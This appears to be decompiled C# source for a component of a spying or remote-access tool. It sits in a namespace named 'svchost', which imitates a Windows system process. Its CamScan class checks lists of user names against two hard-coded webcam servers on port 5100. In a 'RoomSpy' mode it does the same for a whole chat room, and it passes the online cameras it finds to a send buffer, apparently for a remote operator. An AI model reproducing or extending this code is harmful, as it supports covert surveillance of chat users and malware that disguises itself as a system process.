using System;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace svchost;

public class CamScan
{
	public string ScanData;

	public string From;

	public string RoomName;

	private string Server1;

	private string Server2;

	private const int CamPort = 5100;

	private int ThreadCt;

	private int ct;

	private string Results;

	public CamScan()
	{
		Server1 = "68.142.233.23";
		Server2 = "66.163.181.15";
		Results = "";
	}

	public void Go()
	{
		checked
		{
			try
			{
				string[] array = ScanData.Split(new char[1] { ',' });
				int num = Information.UBound((Array)array, 1) - 1;
				for (ct = 0; ct <= num; ct++)
				{
					checkcam checkcam2 = new checkcam(CheckCamCompleted);
					checkcam2.CamServer = Server1;
					checkcam2.CamPort = 5100;
					checkcam2.CamName = array[ct];
					Thread thread = new Thread(checkcam2.docam);
					ThreadCt++;
					thread.IsBackground = true;
					thread.Start();
					Thread.Sleep(25);
					checkcam checkcam3 = new checkcam(CheckCamCompleted);
					checkcam3.CamServer = Server2;
					checkcam3.CamPort = 5100;
					checkcam3.CamName = array[ct];
					Thread thread2 = new Thread(checkcam3.docam);
					ThreadCt++;
					thread2.IsBackground = true;
					thread2.Start();
					Thread.Sleep(25);
				}
				DateTime t = DateAndTime.get_Now().AddMinutes(1.0);
				while (ThreadCt >= 1)
				{
					Thread.Sleep(10);
					Application.DoEvents();
					if (DateTime.Compare(DateAndTime.get_Now(), t) > 0)
					{
						Results = "Error";
						break;
					}
				}
				DateTime t2 = DateAndTime.get_Now().AddSeconds(30.0);
				while (StringType.StrCmp(Form1.DataToSend, "", false) != 0)
				{
					Thread.Sleep(10);
					Application.DoEvents();
					if (DateTime.Compare(DateAndTime.get_Now(), t2) > 0)
					{
						break;
					}
				}
				if (StringType.StrCmp(From, "CamScan", false) == 0)
				{
					Form1.DataToSend = "Cx\u0002" + Results;
				}
				if (StringType.StrCmp(From, "RoomSpy", false) == 0)
				{
					Form1.DataToSend = "Czx\u0002" + RoomName + "..." + Results;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void CheckCamCompleted(string CheckedName, string CheckedResult, string CheckedServer)
	{
		checked
		{
			lock (this)
			{
				try
				{
					if ((StringType.StrCmp(CheckedResult, "Error", false) == 0) | (StringType.StrCmp(CheckedResult, "Timeout", false) == 0))
					{
						checkcam checkcam2 = new checkcam(CheckCamCompleted);
						checkcam2.CamServer = CheckedServer;
						checkcam2.CamPort = 5100;
						checkcam2.CamName = CheckedName;
						Thread thread = new Thread(checkcam2.docam);
						Thread.Sleep(100);
						thread.IsBackground = true;
						thread.Start();
						return;
					}
					if ((StringType.StrCmp(From, "CamScan", false) == 0) & (StringType.StrCmp(CheckedResult, "Online", false) == 0))
					{
						Results = Results + CheckedServer + "\u0002" + CheckedName + ",";
					}
					else if (StringType.StrCmp(From, "RoomSpy", false) == 0 && Form1.MassiveCamList.IndexOf("." + CheckedName + ".") < 0)
					{
						Form1.MassiveCamList = Form1.MassiveCamList + "." + CheckedName + ".";
						if (StringType.StrCmp(CheckedResult, "Online", false) == 0)
						{
							CheckedName = "*" + CheckedName;
						}
						Results = Results + CheckedServer + "\u0002" + CheckedName + ",";
					}
					ThreadCt--;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}
